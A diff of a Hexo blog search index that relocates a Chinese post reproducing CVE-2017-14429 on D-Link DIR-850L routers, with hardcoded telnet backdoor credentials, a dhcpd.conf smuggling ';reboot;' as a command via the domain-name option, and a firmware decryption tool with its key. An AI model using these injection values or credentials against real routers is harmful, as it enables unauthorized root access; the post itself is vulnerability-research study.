@@ -27,59 +27,6 @@
       </tags>
   </entry>
   <entry>
-    <title>cve-2017-14429复现</title>
-    <url>/cve-2017-14429%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>漏洞复现</p>
-<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>cve-2017-14429</p>
-<h2 id="漏洞效果"><a href="#漏洞效果" class="headerlink" title="漏洞效果"></a>漏洞效果</h2><p>可以以root用户的身份执行代码</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>D-Link Dir-850l Firmware Fw114wwb07 H2ab Beta1</li>
-<li>D-Link Dir-850l Firmware Fw208wwb02</li>
-</ul>
-<h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><h3 id="telnet-backdoor"><a href="#telnet-backdoor" class="headerlink" title="telnet backdoor"></a>telnet backdoor</h3><p>login：Alphanetworks;wrgac25_dlink.2013gui_dir850l</p>
-<h3 id="复现简述"><a href="#复现简述" class="headerlink" title="复现简述"></a>复现简述</h3><p>cvedetails上面提供的影响版本是这两个，但是漏洞发现作者说只影响revb版本的，由于a版本的我也没有做实验，不太确定是否影响。</p>
-<p>该漏洞的利用过程是配置一个dhcpd的环境，router作为客户端连接主机并向主机请求ip地址从而实现利用。</p>
-<h3 id="dhcpd环境配置"><a href="#dhcpd环境配置" class="headerlink" title="dhcpd环境配置"></a>dhcpd环境配置</h3><p>安装dhcp服务器</p>
-<p>sudo apt install isc-dhcp-serve</p>
-<p>sudo cat /etc/dhcp/dhcpd.conf</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">option domain-name &quot;;reboot;&quot;;</span><br><span class="line">option domain-name-servers 8.8.8.8, 8.8.4.4;</span><br><span class="line">default-lease-time 600;</span><br><span class="line">max-lease-time 7200;</span><br><span class="line">ddns-update-style none;</span><br><span class="line">subnet 10.254.239.0 netmask 255.255.255.224 &#123;</span><br><span class="line">  range 10.254.239.10 10.254.239.20;</span><br><span class="line">  option routers 10.254.239.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里分配的ip地址要和网卡的ip相对应，而且要设成静态ip。</p>
-<p>启动dhcpd:</p>
-<p>​    sudo dhcpd -4 -f</p>
-<p>如果报错无法加载dhcpd.leases,执行以下命令：</p>
-<p>​    sudo rm -f /var/lib/dhcp/dhcpd.leases</p>
-<p>​    sudo touch /var/lib/dhcp/dhcpd.leases</p>
-<h3 id="路由器连接设置"><a href="#路由器连接设置" class="headerlink" title="路由器连接设置"></a>路由器连接设置</h3><p>需要进路由器页面设置为dhcp获取ip,然后将wan口和主机连接，连接的网卡是之前设置静态ip的网卡。</p>
-<h3 id="初步结果"><a href="#初步结果" class="headerlink" title="初步结果"></a>初步结果</h3><p>可以观察到路由器在启动后，两个指示灯都会变成黄灯，随即路由器开始重启，第一个变成黄色，第二个熄灭，表示重启过程。然后这个过程会一直重复。下图是用wireshark抓包的整个过程。</p>
-<p><img src="/cve-2017-14429%E5%A4%8D%E7%8E%B0/1.png" alt="wireshark抓包"></p>
-<h2 id="后续利用分析"><a href="#后续利用分析" class="headerlink" title="后续利用分析"></a>后续利用分析</h2><p>漏洞的作者在博客中的利用是通过路由器的wget上传一个telnet服务器，可以从wan口进行telnet连接。由于无法实现可以在router系统上执行的程序，所以寻找其他的办法。</p>
-<p>路由器上存在着一个telnet的后门，但是只有路由器reset后才能启用这个后门，之后如果路由器重启的话就消失了。</p>
-<p>如果按照启用这个后门的脚本重新写一个传进路由器的系统中执行，是不是可以重新开启这个后门。但是所编译后的程序都无法在系统中执行，报错为ELF：not found。</p>
-<h2 id="附录1-b类型固件解密代码"><a href="#附录1-b类型固件解密代码" class="headerlink" title="附录1  b类型固件解密代码"></a>附录1  b类型固件解密代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Simple tool to decrypt D-LINK DIR-850L REVB firmwares </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ gcc -o revbdec revbdec.c</span></span><br><span class="line"><span class="comment"> * $ ./revbdec DIR850L_REVB_FW207WWb05_h1ke_beta1.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USAGE <span class="meta-string">&quot;Usage: decimg &lt;filename&gt; &lt;key&gt;\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span>    argc,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">char</span>   **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>     i, fi;</span><br><span class="line">        <span class="keyword">int</span>     fo = STDOUT_FILENO, fe = STDERR_FILENO;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((fi = open(argv[<span class="number">1</span>], O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *key = argv[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> kl = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">                <span class="keyword">int</span> j, len;</span><br><span class="line">                len = read(fi, buffer, <span class="number">4096</span>);</span><br><span class="line">                <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                        buffer[j] ^= (i + j) % <span class="number">0xFB</span> + <span class="number">1</span>;</span><br><span class="line">                        buffer[j] ^= key[(i + j) % kl];</span><br><span class="line">                &#125;</span><br><span class="line">                write(fo, buffer, len);</span><br><span class="line">                i += len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> (EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="附录2-dlink固件下载地址"><a href="#附录2-dlink固件下载地址" class="headerlink" title="附录2 dlink固件下载地址"></a>附录2 dlink固件下载地址</h2><ol>
-<li><a href="http://files.dlink.com.au/products/">http://files.dlink.com.au/products/</a></li>
-<li><a href="ftp://ftp2.dlink.com/">ftp://ftp2.dlink.com/</a></li>
-</ol>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
-<li><p><a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#pre-auth-root-rces">https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#pre-auth-root-rces</a></p>
-</li>
-<li><p><a href="https://pierrekim.github.io/blog/2017-09-21-update-dlink-850l-mydlink-cloud-0days-vulnerabilities.html">https://pierrekim.github.io/blog/2017-09-21-update-dlink-850l-mydlink-cloud-0days-vulnerabilities.html</a></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>dlink</tag>
-        <tag>dhcp_ld</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/hello-world/</url>
     <content><![CDATA[<p>littlewhite,Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -137,6 +84,59 @@
       </categories>
       <tags>
         <tag>nas</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cve-2017-14429复现</title>
+    <url>/cve-2017-14429%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>漏洞复现</p>
+<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>cve-2017-14429</p>
+<h2 id="漏洞效果"><a href="#漏洞效果" class="headerlink" title="漏洞效果"></a>漏洞效果</h2><p>可以以root用户的身份执行代码</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
+<li>D-Link Dir-850l Firmware Fw114wwb07 H2ab Beta1</li>
+<li>D-Link Dir-850l Firmware Fw208wwb02</li>
+</ul>
+<h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><h3 id="telnet-backdoor"><a href="#telnet-backdoor" class="headerlink" title="telnet backdoor"></a>telnet backdoor</h3><p>login：Alphanetworks;wrgac25_dlink.2013gui_dir850l</p>
+<h3 id="复现简述"><a href="#复现简述" class="headerlink" title="复现简述"></a>复现简述</h3><p>cvedetails上面提供的影响版本是这两个，但是漏洞发现作者说只影响revb版本的，由于a版本的我也没有做实验，不太确定是否影响。</p>
+<p>该漏洞的利用过程是配置一个dhcpd的环境，router作为客户端连接主机并向主机请求ip地址从而实现利用。</p>
+<h3 id="dhcpd环境配置"><a href="#dhcpd环境配置" class="headerlink" title="dhcpd环境配置"></a>dhcpd环境配置</h3><p>安装dhcp服务器</p>
+<p>sudo apt install isc-dhcp-serve</p>
+<p>sudo cat /etc/dhcp/dhcpd.conf</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">option domain-name &quot;;reboot;&quot;;</span><br><span class="line">option domain-name-servers 8.8.8.8, 8.8.4.4;</span><br><span class="line">default-lease-time 600;</span><br><span class="line">max-lease-time 7200;</span><br><span class="line">ddns-update-style none;</span><br><span class="line">subnet 10.254.239.0 netmask 255.255.255.224 &#123;</span><br><span class="line">  range 10.254.239.10 10.254.239.20;</span><br><span class="line">  option routers 10.254.239.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里分配的ip地址要和网卡的ip相对应，而且要设成静态ip。</p>
+<p>启动dhcpd:</p>
+<p>​    sudo dhcpd -4 -f</p>
+<p>如果报错无法加载dhcpd.leases,执行以下命令：</p>
+<p>​    sudo rm -f /var/lib/dhcp/dhcpd.leases</p>
+<p>​    sudo touch /var/lib/dhcp/dhcpd.leases</p>
+<h3 id="路由器连接设置"><a href="#路由器连接设置" class="headerlink" title="路由器连接设置"></a>路由器连接设置</h3><p>需要进路由器页面设置为dhcp获取ip,然后将wan口和主机连接，连接的网卡是之前设置静态ip的网卡。</p>
+<h3 id="初步结果"><a href="#初步结果" class="headerlink" title="初步结果"></a>初步结果</h3><p>可以观察到路由器在启动后，两个指示灯都会变成黄灯，随即路由器开始重启，第一个变成黄色，第二个熄灭，表示重启过程。然后这个过程会一直重复。下图是用wireshark抓包的整个过程。</p>
+<p><img src="/cve-2017-14429%E5%A4%8D%E7%8E%B0/1.png" alt="wireshark抓包"></p>
+<h2 id="后续利用分析"><a href="#后续利用分析" class="headerlink" title="后续利用分析"></a>后续利用分析</h2><p>漏洞的作者在博客中的利用是通过路由器的wget上传一个telnet服务器，可以从wan口进行telnet连接。由于无法实现可以在router系统上执行的程序，所以寻找其他的办法。</p>
+<p>路由器上存在着一个telnet的后门，但是只有路由器reset后才能启用这个后门，之后如果路由器重启的话就消失了。</p>
+<p>如果按照启用这个后门的脚本重新写一个传进路由器的系统中执行，是不是可以重新开启这个后门。但是所编译后的程序都无法在系统中执行，报错为ELF：not found。</p>
+<h2 id="附录1-b类型固件解密代码"><a href="#附录1-b类型固件解密代码" class="headerlink" title="附录1  b类型固件解密代码"></a>附录1  b类型固件解密代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Simple tool to decrypt D-LINK DIR-850L REVB firmwares </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ gcc -o revbdec revbdec.c</span></span><br><span class="line"><span class="comment"> * $ ./revbdec DIR850L_REVB_FW207WWb05_h1ke_beta1.bin wrgac25_dlink.2013gui_dir850l &gt; DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USAGE <span class="meta-string">&quot;Usage: decimg &lt;filename&gt; &lt;key&gt;\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span>    argc,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">char</span>   **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>     i, fi;</span><br><span class="line">        <span class="keyword">int</span>     fo = STDOUT_FILENO, fe = STDERR_FILENO;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((fi = open(argv[<span class="number">1</span>], O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">                write(fe, USAGE, <span class="built_in">strlen</span>(USAGE));</span><br><span class="line">                <span class="keyword">return</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *key = argv[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> kl = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">                <span class="keyword">int</span> j, len;</span><br><span class="line">                len = read(fi, buffer, <span class="number">4096</span>);</span><br><span class="line">                <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                        buffer[j] ^= (i + j) % <span class="number">0xFB</span> + <span class="number">1</span>;</span><br><span class="line">                        buffer[j] ^= key[(i + j) % kl];</span><br><span class="line">                &#125;</span><br><span class="line">                write(fo, buffer, len);</span><br><span class="line">                i += len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> (EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="附录2-dlink固件下载地址"><a href="#附录2-dlink固件下载地址" class="headerlink" title="附录2 dlink固件下载地址"></a>附录2 dlink固件下载地址</h2><ol>
+<li><a href="http://files.dlink.com.au/products/">http://files.dlink.com.au/products/</a></li>
+<li><a href="ftp://ftp2.dlink.com/">ftp://ftp2.dlink.com/</a></li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><p><a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#pre-auth-root-rces">https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#pre-auth-root-rces</a></p>
+</li>
+<li><p><a href="https://pierrekim.github.io/blog/2017-09-21-update-dlink-850l-mydlink-cloud-0days-vulnerabilities.html">https://pierrekim.github.io/blog/2017-09-21-update-dlink-850l-mydlink-cloud-0days-vulnerabilities.html</a></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>dlink</tag>
+        <tag>dhcp_ld</tag>
       </tags>
   </entry>
 </search>
